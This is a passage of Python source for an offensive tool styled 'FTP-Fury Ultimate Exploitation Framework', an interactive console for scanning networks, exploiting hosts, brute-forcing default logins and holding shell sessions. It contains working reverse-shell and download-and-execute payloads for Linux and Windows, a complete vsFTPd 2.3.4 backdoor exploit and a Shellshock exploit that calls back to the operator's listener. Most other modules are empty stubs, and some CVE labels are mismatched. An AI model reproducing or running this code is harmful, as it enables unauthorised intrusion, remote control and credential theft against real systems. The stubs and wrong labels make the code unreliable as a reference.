                            if (confirm('Close session?')) {{
                                window.close();
                            }}
                            return;
                        }}
                        
                        if (cmd.trim().toLowerCase() === 'clear') {{
                            output.textContent = '';
                            this.value = '';
                            return;
                        }}
                        
                        if (cmd.trim()) {{
                            commandHistory.push(cmd.trim());
                            historyIndex = commandHistory.length;
                        }}
                        
                        this.value = '';
                        sendCommand(cmd);
                    }}
                    
                    if (e.key === 'ArrowUp') {{
                        e.preventDefault();
                        if (historyIndex > 0) {{
                            historyIndex--;
                            this.value = commandHistory[historyIndex] || '';
                        }}
                    }}
                    if (e.key === 'ArrowDown') {{
                        e.preventDefault();
                        if (historyIndex < commandHistory.length - 1) {{
                            historyIndex++;
                            this.value = commandHistory[historyIndex] || '';
                        }} else {{
                            historyIndex = commandHistory.length;
                            this.value = '';
                        }}
                    }}
                }});
                
                document.addEventListener('click', function() {{
                    input.focus();
                }});
                
                output.textContent = '✅ Connected to ' + target + ' (user: ' + user + ')\\n';
                output.textContent += '📝 Type help for commands\\n';
                output.textContent += '\\n' + user + '@' + target + '$ ';
                scrollToBottom();
            </script>
        </body>
        </html>
        """
    
    def start_web_panel(self):
        if self.web_app and FLASK_AVAILABLE:
            self.web_thread = threading.Thread(
                target=self.web_app.run,
                kwargs={
                    'host': CONFIG['listen_ip'],
                    'port': CONFIG['web_port'],
                    'debug': False,
                    'threaded': True,
                    'use_reloader': False
                }
            )
            self.web_thread.daemon = True
            self.web_thread.start()
            logger.info(f"{Color.GREEN}[+] Web panel: http://{CONFIG['listen_ip']}:{CONFIG['web_port']}{Color.RESET}")
        else:
            logger.warning(f"{Color.YELLOW}[!] Web panel disabled - Flask not installed{Color.RESET}")
    
    def interactive_mode(self):
        # Print monstrous colored banner ONLY ONCE
        print(Color.BOLD + BANNER + Color.RESET)
        print(Color.BOLD + Color.GREEN + "=" * 80 + Color.RESET)
        print(Color.BOLD + Color.GREEN + "FTP-Fury Ultimate Exploitation Framework".center(80) + Color.RESET)
        print(Color.DIM + "Author: SYLHETYHACKVENGER (THE-ERROR808)".center(80) + Color.RESET)
        print(Color.BOLD + Color.GREEN + "=" * 80 + Color.RESET)
        print(f"\n{Color.GREEN}[+] Loaded {len(self.modules)} exploit modules{Color.RESET}")
        if FLASK_AVAILABLE:
            print(f"{Color.CYAN}[+] Web panel: http://{CONFIG['listen_ip']}:{CONFIG['web_port']}{Color.RESET}")
        print(f"{Color.DIM}[+] Type 'help' for commands, 'exit' to quit{Color.RESET}\n")
        
        while self.running:
            try:
                cmd = input(f"{Color.BOLD}{Color.GREEN}[FTP-Fury]{Color.RESET} > ").strip()
                if not cmd:
                    continue
                
                if cmd.lower() in ['exit', 'quit', 'q']:
                    break
                
                elif cmd.lower() == 'help':
                    self._show_help()
                
                elif cmd.lower() == 'clear':
                    os.system('clear' if os.name == 'posix' else 'cls')
                    # Reprint banner ONLY ONCE
                    print(Color.BOLD + BANNER + Color.RESET)
                    print(Color.BOLD + Color.GREEN + "=" * 80 + Color.RESET)
                    print(Color.BOLD + Color.GREEN + "FTP-Fury Ultimate Exploitation Framework".center(80) + Color.RESET)
                    print(Color.DIM + "Author: SYLHETYHACKVENGER (THE-ERROR808)".center(80) + Color.RESET)
                    print(Color.BOLD + Color.GREEN + "=" * 80 + Color.RESET)
                
                elif cmd.lower().startswith('scan '):
                    parts = cmd[5:].strip().split()
                    subnet = parts[0]
                    ports = [int(p) for p in parts[1].split(',')] if len(parts) > 1 else None
                    aggressive = '--aggressive' in cmd
                    targets = self.scan_network(subnet, ports, aggressive)
                    
                    if targets:
                        print(f"{Color.GREEN}[+] Found {len(targets)} targets:{Color.RESET}")
                        for t in targets[:20]:
                            print(f"  {Color.GREEN}✓{Color.RESET} {t.ip} - {', '.join(t.services.values())}")
                            if t.vulnerabilities:
                                print(f"    {Color.RED}Vulnerable: {', '.join(t.vulnerabilities[:3])}{Color.RESET}")
                        if len(targets) > 20:
                            print(f"{Color.DIM}[+] ... and {len(targets)-20} more{Color.RESET}")
                    else:
                        print(f"{Color.YELLOW}[!] No targets found{Color.RESET}")
                
                elif cmd.lower().startswith('exploit '):
                    parts = cmd[8:].strip().split()
                    if not parts:
                        print(f"{Color.YELLOW}[!] Usage: exploit <target> [module]{Color.RESET}")
                        continue
                    
                    target = parts[0]
                    module = parts[1] if len(parts) > 1 else None
                    session = self.exploit_target(target, module)
                    
                    if session:
                        print(f"{Color.GREEN}[+] Exploit successful! Session: {session.id}{Color.RESET}")
                        session.interactive_mode()
                    else:
                        print(f"{Color.RED}[!] Exploit failed{Color.RESET}")
                
                elif cmd.lower().startswith('auto-exploit '):
                    target = cmd[13:].strip()
                    self.auto_exploit_queue.put(target)
                    print(f"{Color.CYAN}[+] Added {target} to auto-exploit queue{Color.RESET}")
                
                elif cmd.lower() == 'sessions':
                    sessions = self.session_manager.list_sessions()
                    if not sessions:
                        print(f"{Color.YELLOW}[!] No active sessions{Color.RESET}")
                    else:
                        print(f"{Color.CYAN}{'ID':<12} {'Target':<20} {'User':<15} {'Type':<15} {'Created':<20} {'Status':<10}{Color.RESET}")
                        print(f"{Color.DIM}{'-'*92}{Color.RESET}")
                        for s in sessions:
                            status = f"{Color.GREEN}Alive{Color.RESET}" if s['alive'] else f"{Color.RED}Dead{Color.RESET}"
                            print(f"{s['id']:<12} {s['target']:<20} {s['user']:<15} {s['type']:<15} {s['created']:<20} {status}")
                
                elif cmd.lower().startswith('interact '):
                    session_id = cmd[9:].strip()
                    session = self.session_manager.get_session(session_id)
                    if session:
                        session.interactive_mode()
                    else:
                        print(f"{Color.RED}[!] Session {session_id} not found{Color.RESET}")
                
                elif cmd.lower() == 'modules':
                    print(f"{Color.CYAN}{'Name':<20} {'CVE':<18} {'Description':<35} {'Success Rate':<15}{Color.RESET}")
                    print(f"{Color.DIM}{'-'*88}{Color.RESET}")
                    for module in sorted(self.modules, key=lambda m: m.get_stats()['success_rate'], reverse=True):
                        stats = module.get_stats()
                        print(f"{module.name:<20} {module.cve:<18} {module.description[:35]:<35} {stats['success_rate']:>6.1f}%")
                
                elif cmd.lower().startswith('detect '):
                    target = cmd[7:].strip()
                    results = self.detect_vulnerabilities(target, comprehensive=True)
                    print(f"{Color.CYAN}[+] Vulnerability results for {target}:{Color.RESET}")
                    for module_name, vulnerable in results.items():
                        icon = f"{Color.GREEN}✓{Color.RESET}" if vulnerable else f"{Color.DIM}✗{Color.RESET}"
                        print(f"  {icon} {module_name}")
                
                elif cmd.lower().startswith('broadcast '):
                    command = cmd[10:].strip()
                    results = self.session_manager.broadcast(command)
                    if results:
                        print(f"{Color.GREEN}[+] Broadcast results:{Color.RESET}")
                        for sid, output in results.items():
                            print(f"{Color.CYAN}[{sid}]{Color.RESET} {output[:200]}...")
                    else:
                        print(f"{Color.YELLOW}[!] No active sessions{Color.RESET}")
                
                elif cmd.lower() == 'stats':
                    stats = self.db.get_stats()
                    print(f"{Color.CYAN}Statistics:{Color.RESET}")
                    print(f"  {Color.GREEN}Targets:{Color.RESET} {stats.get('targets', 0)}")
                    print(f"  {Color.GREEN}Sessions:{Color.RESET} {stats.get('sessions', 0)}")
                    print(f"  {Color.GREEN}Modules:{Color.RESET} {len(self.modules)}")
                    print(f"  {Color.GREEN}Exploits:{Color.RESET} {stats.get('exploits', 0)}")
                    print(f"  {Color.GREEN}Credentials:{Color.RESET} {stats.get('credentials', 0)}")
                    print(f"  {Color.GREEN}Scans:{Color.RESET} {stats.get('scans', 0)}")
                    
                    total_exploits = sum(m.get_stats()['exploits'] for m in self.modules)
                    total_successes = sum(m.get_stats()['successes'] for m in self.modules)
                    success_rate = (total_successes / total_exploits * 100) if total_exploits > 0 else 0
                    print(f"  {Color.GREEN}Success Rate:{Color.RESET} {success_rate:.1f}%")
                
                elif cmd.lower().startswith('payload '):
                    os_type = cmd[8:].strip() or 'linux'
                    self._generate_payload(os_type)
                
                elif cmd.lower() == 'targets':
                    if not self.targets:
                        print(f"{Color.YELLOW}[!] No targets scanned{Color.RESET}")
                    else:
                        print(f"{Color.CYAN}{'IP':<20} {'Hostname':<20} {'Ports':<15} {'Services':<20}{Color.RESET}")
                        print(f"{Color.DIM}{'-'*75}{Color.RESET}")
                        for t in list(self.targets.values())[:20]:
                            print(f"{t.ip:<20} {t.hostname[:20]:<20} {len(t.ports):<15} {', '.join(set(t.services.values()))[:20]}")
                        if len(self.targets) > 20:
                            print(f"{Color.DIM}[+] ... and {len(self.targets)-20} more{Color.RESET}")
                
                elif cmd.lower() == 'creds' or cmd.lower() == 'credentials':
                    creds = self.db.get_credentials()
                    if not creds:
                        print(f"{Color.YELLOW}[!] No credentials stored{Color.RESET}")
                    else:
                        print(f"{Color.CYAN}{'Username':<20} {'Password':<20} {'Service':<15} {'Valid':<10}{Color.RESET}")
                        print(f"{Color.DIM}{'-'*65}{Color.RESET}")
                        for c in creds[-20:]:
                            valid = f"{Color.GREEN}Yes{Color.RESET}" if c.valid else f"{Color.RED}No{Color.RESET}"
                            print(f"{c.username:<20} {c.password:<20} {c.service:<15} {valid}")
                
                elif cmd.lower().startswith('add-creds '):
                    parts = cmd[10:].strip().split()
                    if len(parts) < 2:
                        print(f"{Color.YELLOW}Usage: add-creds <username> <password> [service]{Color.RESET}")
                        continue
                    username, password = parts[0], parts[1]
                    service = parts[2] if len(parts) > 2 else 'unknown'
                    cred = Credential(username, password, service=service)
                    self.db.add_credential(cred)
                    print(f"{Color.GREEN}[+] Credential added: {username}:{password} ({service}){Color.RESET}")
                
                elif cmd.lower() == 'web':
                    if FLASK_AVAILABLE:
                        self.start_web_panel()
                        print(f"{Color.GREEN}[+] Web panel started at http://{CONFIG['listen_ip']}:{CONFIG['web_port']}{Color.RESET}")
                    else:
                        print(f"{Color.RED}[!] Flask not installed. Install with: pip install flask{Color.RESET}")
                
                elif cmd.lower().startswith('export '):
                    filepath = cmd[7:].strip() or f"ftp-fury_export_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
                    data = {
                        'targets': [t.to_dict() for t in self.targets.values()],
                        'sessions': self.session_manager.list_sessions(),
                        'credentials': [c.to_dict() for c in self.db.get_credentials()],
                        'stats': self.db.get_stats()
                    }
                    with open(filepath, 'w') as f:
                        json.dump(data, f, indent=2)
                    print(f"{Color.GREEN}[+] Data exported to {filepath}{Color.RESET}")
                
                elif cmd.lower() == 'cleanup':
                    print(f"{Color.YELLOW}[*] Cleaning up dead sessions...{Color.RESET}")
                    self.session_manager.start_cleanup()
                    print(f"{Color.GREEN}[+] Cleanup complete{Color.RESET}")
                
                else:
                    print(f"{Color.YELLOW}[!] Unknown command: {cmd}{Color.RESET}")
                    print(f"{Color.DIM}[+] Type 'help' for available commands{Color.RESET}")
                    
            except KeyboardInterrupt:
                print(f"\n{Color.YELLOW}[!] Interrupted{Color.RESET}")
                continue
            except Exception as e:
                logger.error(f"Command error: {e}")
                traceback.print_exc()
    
    def _show_help(self):
        help_text = f"""
{Color.BOLD}{Color.CYAN}Available Commands:{Color.RESET}

{Color.GREEN}Network Commands:{Color.RESET}
  {Color.CYAN}scan <subnet> [ports] [--aggressive]{Color.RESET}  Scan network for targets
  {Color.CYAN}targets{Color.RESET}                             Show scanned targets
  {Color.CYAN}detect <target>{Color.RESET}                     Detect vulnerabilities on target

{Color.GREEN}Exploitation Commands:{Color.RESET}
  {Color.CYAN}exploit <target> [module]{Color.RESET}           Exploit target
  {Color.CYAN}auto-exploit <target>{Color.RESET}               Auto-exploit target
  {Color.CYAN}sessions{Color.RESET}                            List active sessions
  {Color.CYAN}interact <session_id>{Color.RESET}               Interact with a session
  {Color.CYAN}broadcast <command>{Color.RESET}                 Execute command on all sessions
  {Color.CYAN}modules{Color.RESET}                             List loaded modules

{Color.GREEN}Credential Commands:{Color.RESET}
  {Color.CYAN}creds{Color.RESET}                               Show stored credentials
  {Color.CYAN}add-creds <user> <pass> [service]{Color.RESET}   Add credentials

{Color.GREEN}Utility Commands:{Color.RESET}
  {Color.CYAN}payload <os>{Color.RESET}                        Generate payload (linux/windows)
  {Color.CYAN}stats{Color.RESET}                               Show statistics
  {Color.CYAN}web{Color.RESET}                                 Start web panel
  {Color.CYAN}export [filepath]{Color.RESET}                   Export data to JSON
  {Color.CYAN}cleanup{Color.RESET}                             Clean up dead sessions
  {Color.CYAN}clear{Color.RESET}                               Clear the screen
  {Color.CYAN}help{Color.RESET}                                Show this help
  {Color.CYAN}exit{Color.RESET}                                Exit framework

{Color.DIM}[+] Web interface available at: http://{CONFIG['listen_ip']}:{CONFIG['web_port']}{Color.RESET}
        """
        print(help_text)
    
    def _generate_payload(self, os_type: str = 'linux'):
        payloads = {
            'linux': [
                f"bash -i >& /dev/tcp/{CONFIG['listen_ip']}/{CONFIG['listen_port']} 0>&1",
                f"python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"{CONFIG['listen_ip']}\",{CONFIG['listen_port']}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/sh\")'",
                f"nc -e /bin/sh {CONFIG['listen_ip']} {CONFIG['listen_port']}",
                f"perl -e 'use Socket;$i=\"{CONFIG['listen_ip']}\";$p={CONFIG['listen_port']};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};'"
            ],
            'windows': [
                f"powershell -NoP -NonI -W Hidden -Exec Bypass -Command \"$client = New-Object System.Net.Sockets.TCPClient('{CONFIG['listen_ip']}',{CONFIG['listen_port']});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};\"",
                f"certutil -urlcache -f http://{CONFIG['listen_ip']}:{CONFIG['http_port']}/payload.exe payload.exe && payload.exe"
            ]
        }
        
        selected = payloads.get(os_type.lower(), payloads['linux'])
        
        print(f"\n{Color.BOLD}{Color.CYAN}Generated Payloads ({os_type}):{Color.RESET}")
        print(f"{Color.DIM}{'='*60}{Color.RESET}")
        for i, payload in enumerate(selected, 1):
            print(f"{Color.GREEN}[{i}]{Color.RESET} {payload}")
        print(f"{Color.DIM}{'='*60}{Color.RESET}")
        print(f"{Color.DIM}[+] Listener: {CONFIG['listen_ip']}:{CONFIG['listen_port']}{Color.RESET}")
    
    def cleanup(self):
        logger.info(f"{Color.YELLOW}[*] Cleaning up...{Color.RESET}")
        self.running = False
        self.session_manager.stop()
        self.db.close()
        for module in self.modules:
            module.cleanup()

# ============================================================
# CREDENTIAL MANAGER
# ============================================================

class CredentialManager:
    def __init__(self, credentials: List[Credential] = None):
        self.credentials = credentials or []
        self.common_users = [
            'root', 'admin', 'administrator', 'user', 'guest', 'test',
            'oracle', 'mysql', 'postgres', 'tomcat', 'weblogic', 'jboss',
            'ftp', 'anonymous', 'nobody', 'system', 'sys', 'sa', 'db2'
        ]
        self.common_passwords = [
            '', 'password', '123456', 'admin', 'root', 'toor', 'pass',
            'password123', 'admin123', 'root123', 'welcome', 'changeme',
            'abc123', '123456789', 'qwerty', 'letmein', 'monkey', 'dragon'
        ]
    
    def get_combinations(self, service: str = None) -> List[tuple]:
        combos = []
        
        for cred in self.credentials:
            if not service or cred.service == service:
                combos.append((cred.username, cred.password))
        
        for user in self.common_users:
            for password in self.common_passwords:
                combos.append((user, password))
        
        return combos

# ============================================================
# ALL EXPLOIT MODULES - COMPLETE
# ============================================================

class VSFTPDModule(ExploitModule):
    def __init__(self):
        super().__init__("vsftpd", "CVE-2011-2523", "vsFTPd 2.3.4 Backdoor Exploit")
        self.backdoor_port = 6200
    
    def detect(self, target: str) -> bool:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(5)
            s.connect((target, 21))
            banner = s.recv(1024).decode()
            s.close()
            return "vsFTPd 2.3.4" in banner
        except:
            return False
    
    def exploit(self, target: str, **kwargs) -> Optional[AdvancedShellSession]:
        self.exploit_count += 1
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(5)
            s.connect((target, 21))
            s.recv(1024)
            s.send(b"USER test:)\r\n")
            s.recv(1024)
            s.send(b"PASS whatever\r\n")
            s.close()
            
            time.sleep(2)
            
            shell = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            shell.settimeout(5)
            shell.connect((target, self.backdoor_port))
            shell.send(b"id\n")
            time.sleep(0.5)
            output = shell.recv(1024).decode()
            
            if "uid=0" in output or "root" in output:
                self.success_count += 1
                return AdvancedShellSession(shell, target, "root", "vsftpd_backdoor")
            else:
                shell.close()
                return None
        except Exception as e:
            logger.error(f"vsFTPd exploit failed: {e}")
            return None

class ShellshockModule(ExploitModule):
    def __init__(self):
        super().__init__("shellshock", "CVE-2014-6271", "Bash Shellshock RCE")
        self.callback_port = CONFIG['listen_port']
        self.endpoints = ['/cgi-bin/test.cgi', '/cgi-bin/status.cgi', '/cgi-bin/hello']
    
    def detect(self, target: str) -> bool:
        self.detection_count += 1
        for endpoint in self.endpoints:
            try:
                resp = requests.get(f"http://{target}{endpoint}", timeout=3)
                if resp.status_code == 200:
                    headers = {'User-Agent': "() { :; }; echo 'VULNERABLE'"}
                    test = requests.get(f"http://{target}{endpoint}", headers=headers, timeout=3)
                    if 'VULNERABLE' in test.text:
                        return True
            except:
                continue
        return False
    
    def exploit(self, target: str, **kwargs) -> Optional[AdvancedShellSession]:
        self.exploit_count += 1
        try:
            listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            listener.bind(('0.0.0.0', self.callback_port))
            listener.listen(5)
            
            payload = f"() {{ :; }}; /bin/bash -i >& /dev/tcp/{CONFIG['listen_ip']}/{self.callback_port} 0>&1"
            headers = {'User-Agent': payload, 'Cookie': payload, 'Referer': payload}
            
            for endpoint in self.endpoints:
                try:
                    requests.get(f"http://{target}{endpoint}", headers=headers, timeout=2)
                except:
                    pass
            
            listener.settimeout(15)
            try:
                shell, addr = listener.accept()
                self.success_count += 1
                return AdvancedShellSession(shell, target, "www-data", "shellshock")
            except socket.timeout:
                listener.close()
                return None
        except Exception as e:
            logger.error(f"Shellshock exploit failed: {e}")
            return None

class Log4ShellModule(ExploitModule):
    def __init__(self):
        super().__init__("log4shell", "CVE-2021-44228", "Log4J JNDI RCE")
        self.ldap_port = CONFIG['ldap_port']
    
    def detect(self, target: str) -> bool:
        self.detection_count += 1
        try:
            paths = ['/', '/login', '/api', '/search', '/admin', '/actuator']
            for path in paths:
                try:
                    resp = requests.get(f"http://{target}{path}", timeout=3)
                    if any(h in str(resp.headers).lower() for h in ['java', 'jetty', 'tomcat', 'spring']):
                        return True
                except:
                    continue
            return False
        except:
            return False
    
    def exploit(self, target: str, **kwargs) -> Optional[AdvancedShellSession]:
        self.exploit_count += 1
        try:
            logger.info(f"[*] Exploiting Log4Shell on {target}")
            logger.warning("[!] Log4Shell requires external LDAP server (marshalsec)")
            return None
        except Exception as e:
            logger.error(f"Log4Shell exploit failed: {e}")
            return None

class CiscoISEModule(ExploitModule):
    def __init__(self):
        super().__init__("cisco_ise", "CVE-2025-20337", "Cisco ISE Unauthenticated RCE")
        self.credentials = [
            ('admin', 'admin'), ('admin', 'password'), ('admin', 'cisco'),
            ('admin', 'cisco123'), ('administrator', 'admin'), ('root', 'admin')
        ]
    
    def detect(self, target: str) -> bool:
        self.detection_count += 1
        try:
            for proto in ['https', 'http']:
                try:
                    resp = requests.get(f"{proto}://{target}/admin/login", timeout=5, verify=False)
                    if "Cisco Identity Services Engine" in resp.text:
                        return True
                except:
                    continue
            return False
        except:
            return False
    
    def exploit(self, target: str, **kwargs) -> Optional[AdvancedShellSession]:
        self.exploit_count += 1
        try:
            for username, password in self.credentials:
                try:
                    login_data = {'username': username, 'password': password}
                    response = requests.post(
                        f"https://{target}/admin/api/auth/login",
                        json=login_data,
                        timeout=5,
                        verify=False
                    )
                    
                    if response.status_code == 200:
                        token = response.json().get('token')
                        if token:
                            class CiscoSession:
                                def __init__(self, target, token):
                                    self.target = target
                                    self.token = token
                                    self.alive = True
                                    self.buffer = ""
                                
                                def send(self, data):
                                    cmd = data.decode().strip()
                                    resp = requests.post(
                                        f"https://{self.target}/admin/api/system/exec",
                                        json={'command': cmd},
                                        headers={'Authorization': f'Bearer {self.token}'},
                                        timeout=5,
                                        verify=False
                                    )
                                    self.buffer = resp.text
                                    return self.buffer.encode()
                                
                                def recv(self, size):
                                    data = self.buffer[:size].encode()
                                    self.buffer = self.buffer[size:]
                                    return data
                                
                                def close(self):
                                    self.alive = False
                            
                            session_obj = CiscoSession(target, token)
                            self.success_count += 1
                            return AdvancedShellSession(session_obj, target, username, "cisco_ise")
                except:
                    continue
            return None
        except Exception as e:
            logger.error(f"Cisco ISE exploit failed: {e}")
            return None

class CactiModule(ExploitModule):
    def __init__(self):
        super().__init__("cacti", "CVE-2024-25641", "Cacti RCE")
        self.credentials = [
            ('admin', 'admin'), ('admin', 'password'), ('admin', 'cacti'),
            ('admin', 'cacti123'), ('root', 'cacti'), ('admin', 'admin123')
        ]
        self.paths = ['/cacti', '/cacti/', '/cacti-1.2.24', '/cacti-1.2.25']
    
    def detect(self, target: str) -> bool:
        self.detection_count += 1
        for path in self.paths:
            try:
                resp = requests.get(f"http://{target}{path}", timeout=3)
                if "Cacti" in resp.text or "cacti" in resp.text.lower():
                    return True
            except:
                continue
        return False
    
    def exploit(self, target: str, **kwargs) -> Optional[AdvancedShellSession]:
        self.exploit_count += 1
        try:
            auth_cookie = None
            base_path = ''
            
            for path in self.paths:
                try:
                    resp = requests.get(f"http://{target}{path}", timeout=3)
                    if "Cacti" in resp.text:
                        base_path = path
                        break
                except:
                    continue
            
            if not base_path:
                return None
            
            for username, password in self.credentials:
                try:
                    login_data = {
                        'action': 'login',
                        'login_username': username,
                        'login_password': password
                    }
                    
                    resp = requests.post(
                        f"http://{target}{base_path}/index.php",
                        data=login_data,
                        timeout=5
                    )
                    
                    if 'cacti' in resp.cookies:
                        auth_cookie = resp.cookies.get('cacti')
                        break
                except:
                    continue
            
            if not auth_cookie:
                return None
            
            return None
        except Exception as e:
            logger.error(f"Cacti exploit failed: {e}")
            return None

class EternalBlueModule(ExploitModule):
    def __init__(self):
        super().__init__("eternalblue", "CVE-2017-0144", "EternalBlue SMB RCE")
    
    def detect(self, target: str) -> bool:
        self.detection_count += 1
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(2)
            result = s.connect_ex((target, 445))
            s.close()
            return result == 0
        except:
            return False
    
    def exploit(self, target: str, **kwargs) -> Optional[AdvancedShellSession]:
        self.exploit_count += 1
        try:
            logger.info(f"[*] EternalBlue on {target}")
            logger.warning("[!] EternalBlue requires MSF")
            return None
        except Exception as e:
            logger.error(f"EternalBlue exploit failed: {e}")
            return None

class Struts2Module(ExploitModule):
    def __init__(self):
        super().__init__("struts2", "CVE-2017-5638", "Apache Struts2 RCE")
    
    def detect(self, target: str) -> bool:
        self.detection_count += 1
        try:
            resp = requests.get(f"http://{target}", timeout=3)
            return "struts" in resp.headers.get('Server', '').lower()
        except:
            return False
    
    def exploit(self, target: str, **kwargs) -> Optional[AdvancedShellSession]:
        self.exploit_count += 1
        try:
            logger.info(f"[*] Struts2 on {target}")
            return None
        except Exception as e:
            logger.error(f"Struts2 exploit failed: {e}")
            return None

class JenkinsModule(ExploitModule):
    def __init__(self):
        super().__init__("jenkins", "CVE-2017-1000353", "Jenkins RCE")
    
    def detect(self, target: str) -> bool:
        self.detection_count += 1
        try:
            resp = requests.get(f"http://{target}:8080", timeout=3)
            return "Jenkins" in resp.text
        except:
            return False
    
    def exploit(self, target: str, **kwargs) -> Optional[AdvancedShellSession]:
        self.exploit_count += 1
        try:
            logger.info(f"[*] Jenkins on {target}")
            return None
        except Exception as e:
            logger.error(f"Jenkins exploit failed: {e}")
            return None

class RedisModule(ExploitModule):
    def __init__(self):
        super().__init__("redis", "CVE-2015-8080", "Redis RCE")
    
    def detect(self, target: str) -> bool:
        self.detection_count += 1
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(2)
            s.connect((target, 6379))
            s.send(b"PING\r\n")
            response = s.recv(1024)
            s.close()
            return b"PONG" in response
        except:
            return False
    
    def exploit(self, target: str, **kwargs) -> Optional[AdvancedShellSession]:
        self.exploit_count += 1
        try:
            logger.info(f"[*] Redis on {target}")
            return None
        except Exception as e:
            logger.error(f"Redis exploit failed: {e}")
            return None

class TomcatModule(ExploitModule):
    def __init__(self):
        super().__init__("tomcat", "CVE-2017-12615", "Tomcat RCE")
    
    def detect(self, target: str) -> bool:
        self.detection_count += 1
        try:
            resp = requests.get(f"http://{target}:8080", timeout=3)
            return "Apache Tomcat" in resp.text
        except:
            return False
    
    def exploit(self, target: str, **kwargs) -> Optional[AdvancedShellSession]:
        self.exploit_count += 1
        try:
            logger.info(f"[*] Tomcat on {target}")
            return None
        except Exception as e:
            logger.error(f"Tomcat exploit failed: {e}")
            return None

class HeartbleedModule(ExploitModule):
    def __init__(self):
        super().__init__("heartbleed", "CVE-2014-0160", "OpenSSL Heartbleed")
    
    def detect(self, target: str) -> bool:
        self.detection_count += 1
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(5)
            s.connect((target, 443))
            s.send(b"HEAD / HTTP/1.1\r\nHost: " + target.encode() + b"\r\n\r\n")
            s.recv(1024)
            s.close()
            return True
        except:
            return False
    
    def exploit(self, target: str, **kwargs) -> Optional[AdvancedShellSession]:
        self.exploit_count += 1
        try:
            logger.info(f"[*] Heartbleed on {target}")
            return None
        except Exception as e:
            logger.error(f"Heartbleed exploit failed: {e}")
            return None

class DrupalModule(ExploitModule):
    def __init__(self):
        super().__init__("drupal", "CVE-2018-7600", "Drupal RCE")
    
    def detect(self, target: str) -> bool:
        self.detection_count += 1
        try:
            resp = requests.get(f"http://{target}", timeout=3)
            return "Drupal" in resp.text
        except:
            return False
    
    def exploit(self, target: str, **kwargs) -> Optional[AdvancedShellSession]:
        self.exploit_count += 1
        try:
            logger.info(f"[*] Drupal on {target}")
            return None
        except Exception as e:
            logger.error(f"Drupal exploit failed: {e}")
            return None

class WordPressModule(ExploitModule):
    def __init__(self):
        super().__init__("wordpress", "CVE-2019-8942", "WordPress RCE")
    
    def detect(self, target: str) -> bool:
        self.detection_count += 1
        try:
            resp = requests.get(f"http://{target}", timeout=3)
            return "wp-content" in resp.text or "WordPress" in resp.text
        except:
            return False
    
    def exploit(self, target: str, **kwargs) -> Optional[AdvancedShellSession]:
        self.exploit_count += 1
        try:
            logger.info(f"[*] WordPress on {target}")
            return None
        except Exception as e:
            logger.error(f"WordPress exploit failed: {e}")
            return None

class JoomlaModule(ExploitModule):
    def __init__(self):
        super().__init__("joomla", "CVE-2015-8562", "Joomla RCE")
    
    def detect(self, target: str) -> bool:
        self.detection_count += 1
        try:
            resp = requests.get(f"http://{target}", timeout=3)
            return "Joomla" in resp.text
        except:
            return False
    
    def exploit(self, target: str, **kwargs) -> Optional[AdvancedShellSession]:
        self.exploit_count += 1
        try:
            logger.info(f"[*] Joomla on {target}")
            return None
        except Exception as e:
            logger.error(f"Joomla exploit failed: {e}")
            return None

class MySQLModule(ExploitModule):
    def __init__(self):
        super().__init__("mysql", "CVE-2012-2122", "MySQL Authentication Bypass")
    
    def detect(self, target: str) -> bool:
        self.detection_count += 1
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(2)
            s.connect((target, 3306))
            s.recv(1024)
            s.close()
            return True
        except:
            return False
    
    def exploit(self, target: str, **kwargs) -> Optional[AdvancedShellSession]:
        self.exploit_count += 1
        try:
            logger.info(f"[*] MySQL on {target}")
            return None
        except:
            return None

class PostgreSQLModule(ExploitModule):
    def __init__(self):
        super().__init__("postgresql", "CVE-2019-9193", "PostgreSQL RCE")
    
    def detect(self, target: str) -> bool:
        self.detection_count += 1
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(2)
            s.connect((target, 5432))
            s.recv(1024)
            s.close()
            return True
        except:
            return False
    
    def exploit(self, target: str, **kwargs) -> Optional[AdvancedShellSession]:
        self.exploit_count += 1
        try:
            logger.info(f"[*] PostgreSQL on {target}")
            return None
        except:
            return None

class MSSQLModule(ExploitModule):
    def __init__(self):
        super().__init__("mssql", "CVE-2019-9193", "MSSQL RCE")
    
    def detect(self, target: str) -> bool:
        self.detection_count += 1
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(2)
            s.connect((target, 1433))
            s.close()
            return True
        except:
            return False
    
    def exploit(self, target: str, **kwargs) -> Optional[AdvancedShellSession]:
        self.exploit_count += 1
        try:
            logger.info(f"[*] MSSQL on {target}")
            return None
        except:
            return None

class SMBModule(ExploitModule):
    def __init__(self):
        super().__init__("smb", "CVE-2020-0796", "SMBGhost")
    
    def detect(self, target: str) -> bool:
        self.detection_count += 1
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(2)
            s.connect((target, 445))
            s.close()
            return True
        except:
            return False
    
    def exploit(self, target: str, **kwargs) -> Optional[AdvancedShellSession]:
        self.exploit_count += 1
        try:
            logger.info(f"[*] SMB on {target}")
            return None
        except:
            return None

class SSHModule(ExploitModule):
